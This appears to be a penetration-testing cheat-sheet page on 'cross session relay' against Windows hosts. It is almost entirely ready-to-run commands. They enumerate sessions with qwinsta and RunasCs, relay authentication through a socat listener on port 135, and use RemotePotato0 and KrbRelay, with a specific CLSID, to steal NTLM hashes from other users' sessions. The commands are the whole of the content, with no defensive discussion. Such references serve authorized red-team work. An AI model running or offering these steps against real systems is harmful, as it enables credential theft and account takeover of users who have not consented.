---
title: "Cross Session Relay"
date: 2024-8-2
tags: ["Ntlm", "Pass-The-Hash", "Authentication", "Cross Session Relay", "Active Directory", "Windows", "Krbrelay", "Remotepotato0"]
---

### Display information about the session host

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
qwinsta *
```

```console
# Or runas
.\RunasCs.exe x x qwinsta -l 9
```

{{< /tabcontent >}}

---

### Abuse #1: Steal NTLM hash

{{< tab set2 tab1 active >}}RemotePotato0{{< /tab >}}
{{< tab set2 tab2 >}}KrbRelay{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Redirect auth request back to target

```console
# In local Linux 
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET>:<RELAY_PORT>
```

#### 2. Trigger auth request

```console
.\RemotePotato0.exe -m 2 -s <TARGET_SESSION_ID> -x <LOCAL_IP> -p <RELAY_PORT>
```

<small>*Ref: [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. All-in-one

```console
.\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm
```

```console
# Or runas
.\RunasCs.exe x x -l 9 "C:\ProgramData\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm"
```

<small>*Ref: [KrbRelay](https://github.com/cube0x0/KrbRelay)*</small>

{{< /tabcontent >}}
